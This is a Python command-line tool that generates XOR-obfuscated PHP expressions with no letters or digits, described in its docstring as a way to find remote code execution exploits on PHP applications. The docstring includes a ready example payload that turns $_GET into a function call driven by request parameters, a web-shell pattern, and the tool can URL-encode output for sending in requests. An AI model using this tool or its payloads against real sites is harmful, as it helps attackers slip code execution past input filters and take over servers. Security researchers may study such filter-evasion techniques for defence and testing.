#!/usr/bin/env python3
import re
import string
import click

def xor(a, b):
    if isinstance(a, str):
        a = bytes(a, 'utf-8', 'replace')

    if isinstance(b, str):
        b = bytes(b, 'utf-8', 'replace')

    return bytes([a[i] ^ b[i % len(b)] for i in range(len(a))])

def url_encode(string):
    if isinstance(string, str):
        string = bytes(string, 'utf-8', 'replace')

    string = string.hex()

    return ''.join([f'%{string[i:i+2]}' for i in range(0, len(string), 2)])

def ascii_not_in(charset):
    left = b''

    for i in range(255):
        i = i.to_bytes(1, 'big')

        if i not in charset:
            left += i

    return left.decode('utf-8', 'replace')

charset = bytes(string.printable + ' ', 'utf-8')
forbidden = ascii_not_in(charset)
known = {}

@click.command()
@click.argument('subject', nargs=-1)
@click.option('-m', '--mask', default='a-z0-9', help="Forbidden characters.", show_default=True)
@click.option('-i', '--case-insensitive', is_flag=True, default=True, help="Mask will ignore case.", show_default=True)
@click.option('-u', '--url', is_flag=True, default=False, help="URL encoded output.")
def cli(subject, mask, case_insensitive, url):
    """
    Finds a XOR pair to represent a string in PHP, using only certain characters.
    Used to find RCE type exploits on PHP applications.
    
    \b
    ./str2PHPnoAlnum.py _GET
    $_="~``|"^"!'%(";    # $_ = "_GET";

    You can use this as a PHP string equal to "_GET".
    It allows you to call a function for example:

    \b
    $_="~``|"^"!'%(";       # $_ = "_GET";
    $_['_']($_['__']);      # $_GET['_']($_GET['__']);

    \b
    @TODO
    - Set a list of mandatory characters ("^$)
    - Set a minimum of non-mandatory characters
    """

    subject = [bytes(i, 'utf-8', 'replace') for i in subject]

    regex = rf'^[^{mask}{forbidden}]+$'
    flags = re.IGNORECASE if case_insensitive else 0
    
    for sub in subject:
        l = len(sub)
        key = b''
        result = b''

        for i in range(l):
            if sub[i] in known.keys():
                kn = known[sub[i]]
                key += kn[0]
                result = kn[1]
                continue

            s = sub[:min(l, i+1)]
            
            for c in charset:
                k = bytes([c])
                r = xor(s, key + k)

                if re.match(regex, r.decode('utf-8', 'replace'), flags) and re.match(regex, k.decode('utf-8', 'replace'), flags):
                    known[sub[i]] = (k, r)
                    key += k
                    result = r
                    break
            
            if len(key) != i+1:
                break
        
        result = result.decode('utf-8', 'backslashreplace').replace('"', '\\"')
        key = key.decode('utf-8', 'backslashreplace').replace('"', '\\"')

        output = '$_="{}"^"{}";'.format(result, key)

        if url:
            output = url_encode(output)

        print('{}    # $_ = "{}";'.format(
            output,
            sub.decode('utf-8', 'backslashreplace')
        ))

if __name__ == '__main__':
    cli()